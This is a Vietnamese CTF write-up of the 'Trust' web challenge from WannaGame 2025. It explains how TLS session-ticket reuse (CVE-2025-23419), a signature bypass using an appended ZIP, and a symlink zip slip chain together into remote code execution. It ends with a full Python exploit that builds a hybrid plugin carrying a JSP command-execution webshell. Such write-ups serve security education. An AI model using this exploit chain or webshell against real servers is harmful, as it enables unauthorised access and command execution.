# Trust

## Trust - WannaGame 2025

**Category**: Web

***

### Tóm tắt

Challenge này yêu cầu khai thác một hệ thống quản lý plugin (Java/Tomcat) nằm sau Nginx reverse proxy.

Để lấy flag, cần chain **3 lỗ hổng**:

| # | Lỗ hổng                            | Mục đích                                      |
| - | ---------------------------------- | --------------------------------------------- |
| 1 | CVE-2025-23419 (SSL Session Reuse) | Bypass xác thực client certificate            |
| 2 | Signature Bypass                   | Upload plugin độc hại qua mặt kiểm tra chữ ký |
| 3 | Zip Slip via Symlink               | Ghi webshell vào webroot để RCE               |

***

### Lỗ hổng 1: SSL Session Reuse (CVE-2025-23419)

#### Bối cảnh

Server Nginx có 2 virtual host trên cùng 1 IP:port:

| Host                           | Yêu cầu xác thực           |
| ------------------------------ | -------------------------- |
| `public.trustboundary.local`   | ❌ Không cần client cert    |
| `employee.trustboundary.local` | ✅ **Bắt buộc** client cert |

API quản lý plugin (`/api/plugins/*`) chỉ cho phép truy cập qua host `employee`, tức là cần có client certificate hợp lệ.

#### Vấn đề

Nginx được cấu hình với `ssl_session_tickets on`. Tính năng này cho phép client **tái sử dụng phiên SSL** đã thiết lập trước đó để tăng tốc kết nối.

**Lỗ hổng**: Khi session được resume, Nginx **không kiểm tra lại** client certificate!

#### Cách khai thác

```
Bước 1: Kết nối tới "public.trustboundary.local" (không cần cert)
        → Server trả về Session Ticket
        
Bước 2: Mở kết nối mới tới "employee.trustboundary.local"
        → Gửi kèm Session Ticket từ bước 1
        
Bước 3: Nginx thấy Session Ticket hợp lệ → Resume session
        → KHÔNG kiểm tra client certificate
        → Bypass thành công! Giờ có thể truy cập /api/plugins/*
```

#### Tại sao hoạt động?

SSL Session Ticket được mã hóa bởi server và chứa thông tin phiên (session state). Khi client gửi ticket, server giải mã và khôi phục phiên cũ mà **không chạy lại handshake đầy đủ** - bao gồm cả bước xác thực client certificate.

***

### Lỗ hổng 2: Plugin Signature Bypass

#### Bối cảnh

Server yêu cầu plugin phải có **chữ ký số hợp lệ** trước khi cài đặt. Cấu trúc plugin:

```
[Nội dung ZIP] + [---SIG_START---] + [Chữ ký] + [---SIG_END---]
```

#### Vấn đề

Có sự **không nhất quán** giữa 2 hàm xử lý:

| Hàm                   | Cách đọc file                                                  |
| --------------------- | -------------------------------------------------------------- |
| `validateSignature()` | Tìm marker `SIG_START`/`SIG_END`, verify phần **TRƯỚC** marker |
| `extractPlugin()`     | Dùng `ZipFile` đọc Central Directory từ **CUỐI** file          |

**Điểm mấu chốt**: Format ZIP lưu "mục lục" (Central Directory) ở **cuối file**. Khi mở file ZIP, thư viện sẽ tìm mục lục này từ cuối và đọc nội dung theo đó.

#### Cách khai thác

Tạo file "hybrid" bằng cách **nối** 2 file lại:

```
┌─────────────────────────────────────────────────┐
│  PLUGIN HỢP LỆ (có signature)                   │  ← validateSignature() đọc phần này
│  ├── ZIP content                                │
│  ├── ---SIG_START---                            │
│  ├── [valid signature]                          │
│  └── ---SIG_END---                              │
├─────────────────────────────────────────────────┤
│  ZIP ĐỘC HẠI (không signature)                  │  ← extractPlugin() đọc phần này
│  ├── link/ (symlink)                            │
│  ├── link/shell.jsp (webshell)                  │
│  └── [Central Directory ở cuối cùng]            │
└─────────────────────────────────────────────────┘
```

**Kết quả**:

* `validateSignature()`: Tìm thấy signature ở giữa file → ✅ Xác thực thành công
* `extractPlugin()`: `ZipFile` đọc Central Directory ở cuối → Giải nén ZIP độc hại!

***

### Lỗ hổng 3: Zip Slip via Symlink

#### Bối cảnh

"Zip Slip" là lỗ hổng cho phép ghi file ra ngoài thư mục đích khi giải nén ZIP. Server đã cố gắng chặn bằng cách kiểm tra symlink:

```java
if (Files.exists(resolved) && Files.isSymbolicLink(resolved)) {
    Path linkTarget = Files.readSymbolicLink(resolved);
    resolved = resolved.getParent().resolve(linkTarget).normalize();
    
    // Kiểm tra bảo mật
    if (Files.exists(resolved) && Files.isRegularFile(resolved)) {
        if (!resolved.startsWith(targetDir)) {
            throw new SecurityException("Symlink escape!");
        }
    }
}
```

#### Vấn đề

Điều kiện `Files.isRegularFile(resolved)` chỉ đúng khi target là **file thông thường**.

Nếu symlink trỏ tới **thư mục** → `isRegularFile()` trả về `false` → **Không kiểm tra gì cả**!

#### Cách khai thác

Tạo ZIP với 2 entry:

```
Entry 1: "link" (symlink)
         └── Trỏ tới: /usr/local/tomcat/webapps/ROOT (THƯ MỤC webroot)
         
Entry 2: "link/shell.jsp" (file thường)
         └── Nội dung: <% Runtime.exec(cmd) %>
```

**Khi giải nén**:

1. Entry 1: Tạo symlink `link` → `/usr/local/tomcat/webapps/ROOT`
   * Target là thư mục → Bypass kiểm tra!
2. Entry 2: Ghi file `link/shell.jsp`
   * Thực tế ghi vào: `/usr/local/tomcat/webapps/ROOT/shell.jsp`

**Kết quả**: Webshell được ghi vào webroot → Truy cập `/shell.jsp?cmd=whoami` → **RCE**!

***

### Chuỗi khai thác hoàn chỉnh

```
┌──────────────────┐
│  1. Download     │  Tải client.crt và client.key từ public host
│     Certs        │  (Server cung cấp sẵn cho mục đích demo)
└────────┬─────────┘
         ▼
┌──────────────────┐
│  2. SSL Session  │  Kết nối public → Lấy session ticket
│     Reuse        │  Dùng ticket kết nối employee → Bypass cert check
└────────┬─────────┘
         ▼
┌──────────────────┐
│  3. Download     │  GET /api/plugins → Lấy danh sách plugin
│     Valid Plugin │  Download plugin hợp lệ (có signature)
└────────┬─────────┘
         ▼
┌──────────────────┐
│  4. Create       │  Tạo ZIP độc hại với symlink + webshell
│     Hybrid       │  Nối vào sau plugin hợp lệ
└────────┬─────────┘
         ▼
┌──────────────────┐
│  5. Upload &     │  POST /api/plugins/upload
│     Install      │  Server verify (OK) và extract (Zip Slip!)
└────────┬─────────┘
         ▼
┌──────────────────┐
│  6. Trigger      │  GET /shell.jsp?cmd=/readflag
│     RCE          │  → Trả về flag!
└──────────────────┘
```

***

### Chạy Exploit

```bash
python exploit.py
```

Script tự động thực hiện tất cả các bước trên

#### Output mẫu

```
[*] Downloading certificates...
   [+] Saved client.crt
   [+] Saved client.key
[*] Establishing SSL session...
[*] Listing available plugins...
   [+] Found plugins: [{'name': 'hello-world.plugin'}]
[+] Successfully downloaded hello-world.plugin
[+] Saved hybrid exploit to exploit.zip
[*] Uploading exploit plugin...
[+] Upload successful
[*] Triggering /shell.jsp?cmd=/readflag...

[!!!] FLAG FOUND [!!!]
W1{C3rTs-m34n-N0TH1Ng_w1thOUt-prOP3R-usAg3_pI5_tAK3-1T_lN-MInD8}
```

***

### Flag

```
W1{C3rTs-m34n-N0TH1Ng_w1thOUt-prOP3R-usAg3_pI5_tAK3-1T_lN-MInD8}
```

***

### Exploit Code

```python
import socket
import ssl
import sys
import os
import zipfile
import io
import time
import json

HOST_IP = "challenge.cnsc.com.vn"
HOST_PORT = 30173
PUBLIC_HOST = "public.trustboundary.local"
EMPLOYEE_HOST = "employee.trustboundary.local"

def unchunk(body):
    new_body = b""
    while body:
        try:
            line, rest = body.split(b"\r\n", 1)
            size = int(line, 16)
            if size == 0: break
            new_body += rest[:size]
            body = rest[size+2:]
        except ValueError:
            new_body += body
            break
    return new_body

def download_certs():
    print("[*] Downloading certificates...")
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    for path, filename in [("/download/client.crt", "client.crt"), ("/download/client.key", "client.key")]:
        try:
            sock = socket.create_connection((HOST_IP, HOST_PORT))
            ssock = context.wrap_socket(sock, server_hostname=PUBLIC_HOST)
            request = f"GET {path} HTTP/1.1\r\nHost: {PUBLIC_HOST}\r\nConnection: close\r\n\r\n"
            ssock.sendall(request.encode())
            response = b""
            while True:
                data = ssock.recv(4096)
                if not data: break
                response += data
            ssock.close()
            if b"\r\n\r\n" in response:
                header, body = response.split(b"\r\n\r\n", 1)
                if b"200 " in header:
                    if b"Transfer-Encoding: chunked" in header or b"transfer-encoding: chunked" in header:
                        body = unchunk(body)
                    with open(filename, "wb") as f:
                        f.write(body)
                    print(f"   [+] Saved {filename}")
                else:
                    h0 = header.splitlines()[0]
                    print(f"   [-] Failed to download {filename}. Header: {h0}")
            else:
                 print(f"   [-] Invalid response for {filename}")
        except Exception as e:
            print(f"   [-] Failed to download {filename}: {e}")

def create_client_context():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.load_cert_chain(certfile="client.crt", keyfile="client.key")
    return context

def get_session(context):
    print("[*] Establishing SSL session...")
    sock = socket.create_connection((HOST_IP, HOST_PORT))
    ssock = context.wrap_socket(sock, server_hostname=PUBLIC_HOST)
    ssock.sendall(f"GET /health HTTP/1.1\r\nHost: {PUBLIC_HOST}\r\nConnection: keep-alive\r\n\r\n".encode())
    ssock.recv(1024)
    session = ssock.session
    ssock.close()
    return session

def list_plugins(context, session):
    print("[*] Listing available plugins...")
    try:
        sock = socket.create_connection((HOST_IP, HOST_PORT))
        ssock = context.wrap_socket(sock, server_hostname=EMPLOYEE_HOST, session=session)
        request = f"GET /api/plugins HTTP/1.1\r\nHost: {EMPLOYEE_HOST}\r\nConnection: close\r\n\r\n"
        ssock.sendall(request.encode())
        
        response = b""
        while True:
            data = ssock.recv(4096)
            if not data: break
            response += data
        ssock.close()
        
        if b"\r\n\r\n" in response:
            header, body = response.split(b"\r\n\r\n", 1)
            if b"200 " in header:
                if b"Transfer-Encoding: chunked" in header or b"transfer-encoding: chunked" in header:
                    body = unchunk(body)
                try:
                    data = json.loads(body)
                    print(f"   [+] Found plugins: {data}")
                    return data.get("plugins", [])
                except Exception as e:
                    print(f"   [-] Failed to parse JSON: {e}")
            else:
                h0 = header.splitlines()[0]
                print(f"   [-] List plugins status not 200: {h0}")
        else:
            print("   [-] List plugins: No response body")
    except Exception as e:
        print(f"   [-] List plugins error: {e}")
    return []

def download_plugin(context, session, filename):
    print(f"[*] Downloading base plugin {filename}...")
    try:
        sock = socket.create_connection((HOST_IP, HOST_PORT))
        ssock = context.wrap_socket(sock, server_hostname=EMPLOYEE_HOST, session=session)
        request = f"GET /{filename} HTTP/1.1\r\nHost: {EMPLOYEE_HOST}\r\nConnection: close\r\n\r\n"
        ssock.sendall(request.encode())
        
        response = b""
        while True:
            data = ssock.recv(4096)
            if not data: break
            response += data
        ssock.close()
        
        if b"\r\n\r\n" in response:
            header, body = response.split(b"\r\n\r\n", 1)
            if b"200 " in header:
                if b"Transfer-Encoding: chunked" in header or b"transfer-encoding: chunked" in header:
                    body = unchunk(body)
                return body
            else:
                h0 = header.splitlines()[0]
                print(f"   [-] Download status not 200: {h0}")
    except Exception as e:
        print(f"   [-] Download error: {e}")
    return None

def upload_exploit(context, session, plugin_data, exploit_filename="rce.plugin"):
    print("[*] Uploading exploit plugin...")
    boundary = "---------------------------PYRCE_LIVE"
    body = io.BytesIO()
    body.write(f"--{boundary}\r\n".encode())
    body.write(f'Content-Disposition: form-data; name="plugin"; filename="{exploit_filename}"\r\n'.encode())
    body.write(b"Content-Type: application/octet-stream\r\n\r\n")
    body.write(plugin_data)
    body.write(b"\r\n")
    body.write(f"--{boundary}--\r\n".encode())
    body_bytes = body.getvalue()
    
    try:
        sock = socket.create_connection((HOST_IP, HOST_PORT))
        ssock = context.wrap_socket(sock, server_hostname=EMPLOYEE_HOST, session=session)
        
        req = f"POST /api/plugins/upload HTTP/1.1\r\nHost: {EMPLOYEE_HOST}\r\nContent-Type: multipart/form-data; boundary={boundary}\r\nContent-Length: {len(body_bytes)}\r\nConnection: close\r\n\r\n"
        ssock.sendall(req.encode() + body_bytes)
        
        response = b""
        while True:
            data = ssock.recv(4096)
            if not data: break
            response += data
        ssock.close()
        
        resp_dec = response.decode(errors='replace')
        if b"200 " in response or b"success" in response:
            print("[+] Upload successful")
            return True
        print("[-] Upload failed")
        print(resp_dec[:500])
    except Exception as e:
        print(f"[-] Upload error: {e}")
    return False

def trigger(context, session, url_path):
    print(f"[*] Triggering {url_path}...")
    try:
        sock = socket.create_connection((HOST_IP, HOST_PORT))
        ssock = context.wrap_socket(sock, server_hostname=EMPLOYEE_HOST, session=session)
        req = f"GET {url_path} HTTP/1.1\r\nHost: {EMPLOYEE_HOST}\r\nConnection: close\r\n\r\n"
        ssock.sendall(req.encode())
        
        response = b""
        while True:
            data = ssock.recv(4096)
            if not data: break
            response += data
        ssock.close()
        
        if b"\r\n\r\n" in response:
            _, body = response.split(b"\r\n\r\n", 1)
            resp_str = body.decode(errors='replace').strip()
            print(f"[+] Response: {resp_str}")
            if "W1{" in resp_str:
                print("\n[!!!] FLAG FOUND [!!!]")
                print(resp_str)
                return True
    except Exception as e:
        print(f"[-] Trigger error: {e}")
    return False

def main():
    download_certs()
    try:
        context = create_client_context()
    except Exception as e:
        print(f"[-] Error loading certs: {e}")
        return

    session = get_session(context)
    
    # 1. Find a valid base plugin
    plugins = list_plugins(context, session)
    original = None
    
    prefixes = ["", "plugins/", "api/plugins/", "download/", "uploads/", "api/download/"]
    
    if plugins:
        for p in plugins:
            base_name = p['name']
            for prefix in prefixes:
                path = prefix + base_name
                print(f"[*] Trying to download {path}...")
                original = download_plugin(context, session, path)
                if original:
                    print(f"[+] Successfully downloaded {base_name} from {path}")
                    with open("base.zip", "wb") as f:
                        f.write(original)
                    print("[+] Saved base plugin to base.zip")
                    break
            if original: break
    
    # Fallback 1: Blind download
    if not original:
        print("[*] Trying blind download of 'hello-world.plugin'...")
        original = download_plugin(context, session, "hello-world.plugin")
        if original:
             with open("base.zip", "wb") as f:
                    f.write(original)

    # Fallback 2: Local file
    if not original:
        print("[-] Listing/Download failed. Trying local hello.zip fallback...")
        if os.path.exists("hello.zip"):
             print("[*] Using local hello.zip")
             with open("hello.zip", "rb") as f:
                 original = f.read()
        else:
             print("[-] Local hello.zip not found.")

    if not original:
        print("[-] Fatal: No base plugin found (and local cache cleaned).")
        return

    # 3. Payload 
    payload_io = io.BytesIO()
    with zipfile.ZipFile(payload_io, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Symlink Bypass
        info = zipfile.ZipInfo("link")
        info.create_system = 3
        info.external_attr = (0o120777) << 16 # Symlink
        zf.writestr(info, "/usr/local/tomcat/webapps/ROOT")
        
        info_shell = zipfile.ZipInfo("link/shell.jsp")
        info_shell.create_system = 3
        info_shell.external_attr = (0o100644) << 16
        zf.writestr(info_shell, '<% java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\\\A"); out.print(s.hasNext() ? s.next() : ""); %>')
        
    hybrid_plugin = original + payload_io.getvalue()
    
    with open("exploit.zip", "wb") as f:
        f.write(hybrid_plugin)
    print("[+] Saved hybrid exploit to exploit.zip")
    
    if upload_exploit(context, session, hybrid_plugin):
        time.sleep(2)
        trigger(context, session, "/shell.jsp?cmd=/readflag")

if __name__ == "__main__":
    main()
```
